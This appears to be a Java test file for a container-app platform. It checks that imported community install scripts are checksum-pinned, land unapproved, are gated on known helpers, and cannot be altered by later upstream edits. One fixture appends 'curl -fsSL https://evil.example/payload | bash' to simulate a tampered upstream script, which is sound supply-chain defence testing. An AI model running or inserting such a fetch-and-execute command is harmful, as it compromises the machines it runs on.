package be.elevenways.hohenheim.test.instance;

import be.elevenways.hohenheim.test.TestDatabases;
import be.elevenways.zenit.common.orm.datasource.Datasources;
import be.elevenways.hohenheim.model.InstanceModel;
import be.elevenways.hohenheim.model.InstanceTemplateModel;
import be.elevenways.hohenheim.server.instance.CommunityScripts;
import be.elevenways.hohenheim.server.instance.InstanceInstalls;
import be.elevenways.hohenheim.test.HohenheimTestRuntime;
import be.elevenways.hohenheim.test.host.HostFixtures;
import be.elevenways.zenit.common.orm.datasource.Db;
import be.elevenways.zenit.common.orm.datasource.Row;
import be.elevenways.zenit.common.orm.model.Models;
import be.elevenways.zenit.common.validation.Violations;
import be.elevenways.zenit.common.orm.datasource.sql.SqlDatasource;
import be.elevenways.zenit.server.orm.migration.MigrationRunner;
import be.elevenways.zenit.server.security.SecureTokens;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.UncheckedIOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Instant;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.catchThrowable;

/**
 * The vendored community-scripts catalog WITHOUT a daemon: manifest parsing and the
 * content pin of an import, the vocabulary gate's static lane at import and install
 * (refusals BY NAME, with the healthy scripts as the positive anchor), and the
 * upstream-edit invariance -- a changed source can only mint a NEW unapproved row,
 * never mutate what an operator already approved. The gate's RUNTIME lane
 * (command_not_found_handle) is proven by IncusCommunityAppLiveTest on the real host.
 */
class CommunityScriptCatalogTest {

    private static SqlDatasource datasource;

    @BeforeAll
    static void setUp() throws Exception {
        datasource = TestDatabases.freshDatasource();
        // ONE database per test class: the controller identity (and therefore every
        // daemon resource name) resolves through the CURRENT datasource, and a Db scope
        // is thread-local -- so a second, unregistered database would hand any
        // thread-hopping work a different controller's token than the records came from.
        HohenheimTestRuntime.ensureBooted();
    }

    @AfterAll
    static void tearDown() {
        CommunityScripts.overrideCatalogRootForTest(null);
    }

    @Test
    void catalogImportPinsScriptContentAndLandsUnapproved() {
        Db.run(datasource, () -> {
            // 1. The catalog names both vendored apps and its pinned revision.
            assertThat(CommunityScripts.catalogApps())
                .as("step 1: the vendored catalog lists gotify and adguard")
                .containsExactlyInAnyOrder("gotify", "adguard");
            assertThat(CommunityScripts.catalogRevision())
                .as("step 1: the pin is a full git revision")
                .matches("[0-9a-f]{40}");

            // 2. The gotify manifest maps var_* onto real instance-template data.
            CommunityScripts.Manifest manifest = CommunityScripts.manifestOf("gotify");
            assertThat(manifest.app()).as("step 2: APP name").isEqualTo("Gotify");
            assertThat(manifest.imageAlias())
                .as("step 2: var_os/var_version become the image alias")
                .isEqualTo("debian/13");
            assertThat(manifest.ramMb()).as("step 2: var_ram").isEqualTo(512);
            assertThat(manifest.cpu()).as("step 2: var_cpu").isEqualTo(1);
            assertThat(manifest.unprivileged())
                .as("step 2: var_unprivileged=1 stays unprivileged").isTrue();
            assertThat(manifest.updateScript())
                .as("step 2: update_script() was extracted from the ct manifest")
                .contains("check_for_gh_release")
                .doesNotContain("update_script()");

            // 3. Import copies the PINNED script bytes into the row: checksummed,
            //    source-attributed, and NEVER approved.
            int templateId = CommunityScripts.importApp("gotify");
            Row template = Models.get(InstanceTemplateModel.class).findById(templateId);
            String vendored = resource("catalog/gotify/install.sh");
            assertThat((String) template.get(InstanceTemplateModel.INSTALL_SCRIPT))
                .as("step 3: the install script is the vendored content, byte for byte")
                .isEqualTo(vendored);
            assertThat((String) template.get(InstanceTemplateModel.SOURCE_CHECKSUM))
                .as("step 3: the checksum covers the install script bytes")
                .isEqualTo(SecureTokens.sha256Hex(vendored));
            assertThat((String) template.get(InstanceTemplateModel.SOURCE))
                .as("step 3: the source names repo, revision and app")
                .contains("community-scripts/ProxmoxVE@")
                .contains(CommunityScripts.catalogRevision())
                .contains("gotify");
            assertThat((Object) template.get(InstanceTemplateModel.APPROVED_AT))
                .as("step 3: an import NEVER lands approved").isNull();
            assertThat((String) template.get(InstanceTemplateModel.KIND))
                .as("step 3: catalog apps are incus system containers")
                .isEqualTo("hohenheim:system_container");
            Map<?, ?> settings = (Map<?, ?>) template.get(InstanceTemplateModel.SETTINGS);
            assertThat(settings.get("image")).as("step 3: image alias").isEqualTo("debian/13");
            assertThat(settings.get("memory_limit_mb")).as("step 3: var_ram landed")
                .isEqualTo(512);
            assertThat(settings.get("privileged")).as("step 3: unprivileged posture")
                .isEqualTo(false);

            // 4. Positive anchor of the vocabulary gate: both vendored apps' scripts
            //    pass with the shipped shim library.
            for (String app : CommunityScripts.catalogApps()) {
                String install = resource("catalog/" + app + "/install.sh");
                CommunityScripts.requireVocabularyImplemented(install, app + " install");
                CommunityScripts.requireVocabularyImplemented(
                    CommunityScripts.manifestOf(app).updateScript(), app + " update");
            }
        });
    }

    @Test
    void vocabularyGateRefusesUnimplementedHelpersByName() {
        Db.run(datasource, () -> {
            String hwaccelScript = "source /dev/stdin <<<\"$FUNCTIONS_FILE_PATH\"\n"
                + "color\nverb_ip6\ncatch_errors\nsetup_hwaccel\n";

            // 1. The static gate refuses the host-coupled helper BY NAME.
            Throwable refused = catchThrowable(() ->
                CommunityScripts.requireVocabularyImplemented(hwaccelScript, "install script"));
            assertThat(refused)
                .as("step 1: an unimplemented upstream helper is a typed refusal")
                .isInstanceOfSatisfying(Violations.class, violations ->
                    assertThat(violations.all()).anySatisfy(violation -> {
                        assertThat(violation.message().key())
                            .isEqualTo("helper_not_implemented");
                        assertThat(String.valueOf(violation.message().args().get("helpers")))
                            .as("step 1: and it NAMES the helper")
                            .contains("setup_hwaccel");
                    }));

            // 2. A script that never sources the library is NOT judged: hand-authored
            //    install scripts owe the community vocabulary nothing.
            CommunityScripts.requireVocabularyImplemented(
                "apk add --no-cache curl\nsetup_hwaccel_lookalike\n", "install script");

            // 3. The INSTALL-TIME lane: an instance whose template carries the hwaccel
            //    script is refused by the same name, BEFORE any daemon work.
            HostFixtures.admitLocal();
            Row template = Models.get(InstanceTemplateModel.class).createEmptyRow();
            template.set(InstanceTemplateModel.NAME, "catalog-gate-fixture");
            template.set(InstanceTemplateModel.KIND, "hohenheim:docker_container");
            template.set(InstanceTemplateModel.SETTINGS,
                Map.of("image", "alpine", "tag", "latest"));
            template.set(InstanceTemplateModel.INSTALL_SCRIPT, hwaccelScript);
            template.set(InstanceTemplateModel.APPROVED_AT, Instant.now());
            Models.get(InstanceTemplateModel.class).save(template);

            Row instance = Models.get(InstanceModel.class).createEmptyRow();
            instance.set(InstanceModel.NAME, "catalog-gate-fixture");
            instance.set(InstanceModel.KIND, "hohenheim:docker_container");
            instance.set(InstanceModel.SETTINGS, Map.of("image", "alpine", "tag", "latest"));
            instance.set(InstanceModel.TEMPLATE_ID,
                template.get(InstanceTemplateModel.ID));
            instance.set(InstanceModel.INSTALL_STATE, InstanceModel.INSTALL_PENDING);
            Models.get(InstanceModel.class).save(instance);
            int instanceId = instance.get(InstanceModel.ID);

            try {
                Throwable installRefused = catchThrowable(() ->
                    new InstanceInstalls().install(instanceId));
                assertThat(installRefused)
                    .as("step 3: install refuses the unimplemented helper by name")
                    .isInstanceOfSatisfying(Violations.class, violations ->
                        assertThat(violations.all()).anySatisfy(violation ->
                            assertThat(violation.message().key())
                                .isEqualTo("helper_not_implemented")));
                assertThat((String) Models.get(InstanceModel.class).findById(instanceId)
                        .get(InstanceModel.INSTALL_STATE))
                    .as("step 3: and nothing ran -- the install state never left pending")
                    .isEqualTo(InstanceModel.INSTALL_PENDING);
            } finally {
                Models.get(InstanceModel.class).delete(instanceId);
                Models.get(InstanceTemplateModel.class)
                    .delete(template.get(InstanceTemplateModel.ID));
            }
        });
    }

    @Test
    void upstreamEditCannotChangeAnApprovedTemplate() throws IOException {
        // A writable copy of the bundled catalog stands in for the upstream source.
        Path root = Files.createTempDirectory("hh-catalog-override");
        copyResource(root, "hohenheim-functions.sh");
        copyResource(root, "upstream-vocabulary.txt");
        copyResource(root, "catalog/REVISION");
        copyResource(root, "catalog/gotify/ct.sh");
        copyResource(root, "catalog/gotify/install.sh");
        copyResource(root, "catalog/adguard/ct.sh");
        copyResource(root, "catalog/adguard/install.sh");
        CommunityScripts.overrideCatalogRootForTest(root);
        try {
            Db.run(datasource, () -> {
                // 1. Import and approve (the operator act, simulated at the row).
                int approvedId = CommunityScripts.importApp("gotify");
                Row approved = Models.get(InstanceTemplateModel.class).findById(approvedId);
                approved.set(InstanceTemplateModel.APPROVED_AT, Instant.now());
                Models.get(InstanceTemplateModel.class).save(approved);
                String pinnedScript = approved.get(InstanceTemplateModel.INSTALL_SCRIPT);
                String pinnedChecksum = approved.get(InstanceTemplateModel.SOURCE_CHECKSUM);

                // 2. Upstream "edits main": the source file changes under us.
                try {
                    Files.writeString(root.resolve("catalog/gotify/install.sh"),
                        pinnedScript + "\ncurl -fsSL https://evil.example/payload | bash\n",
                        StandardCharsets.UTF_8);
                } catch (IOException e) {
                    throw new UncheckedIOException(e);
                }
                CommunityScripts.overrideCatalogRootForTest(root);   // drop caches

                // 3. The approved template is UNTOUCHED, byte for byte -- what an
                //    approved template installs is the row, never the source.
                Row after = Models.get(InstanceTemplateModel.class).findById(approvedId);
                assertThat((String) after.get(InstanceTemplateModel.INSTALL_SCRIPT))
                    .as("step 3: the approved row still carries the pinned script")
                    .isEqualTo(pinnedScript)
                    .doesNotContain("evil.example");
                assertThat((Object) after.get(InstanceTemplateModel.APPROVED_AT))
                    .as("step 3: and its approval stands").isNotNull();

                // 4. Importing the edited source can only mint a NEW, UNAPPROVED row
                //    with a DIFFERENT checksum -- the trust decision starts over.
                int freshId = CommunityScripts.importApp("gotify");
                assertThat(freshId).as("step 4: a re-import is a new row")
                    .isNotEqualTo(approvedId);
                Row fresh = Models.get(InstanceTemplateModel.class).findById(freshId);
                assertThat((Object) fresh.get(InstanceTemplateModel.APPROVED_AT))
                    .as("step 4: the fresh import is unapproved").isNull();
                assertThat((String) fresh.get(InstanceTemplateModel.SOURCE_CHECKSUM))
                    .as("step 4: and its checksum differs from the approved pin")
                    .isNotEqualTo(pinnedChecksum);
            });
        } finally {
            CommunityScripts.overrideCatalogRootForTest(null);
        }
    }

    // -- plumbing -------------------------------------------------------------

    private static String resource(String relative) {
        try (InputStream in = CommunityScriptCatalogTest.class.getClassLoader()
                .getResourceAsStream("community-scripts/" + relative)) {
            assertThat(in).as("bundled resource community-scripts/" + relative).isNotNull();
            return new String(in.readAllBytes(), StandardCharsets.UTF_8);
        } catch (IOException e) {
            throw new UncheckedIOException(e);
        }
    }

    private static void copyResource(Path root, String relative) throws IOException {
        Path target = root.resolve(relative);
        Files.createDirectories(target.getParent());
        Files.writeString(target, resource(relative), StandardCharsets.UTF_8);
    }
}
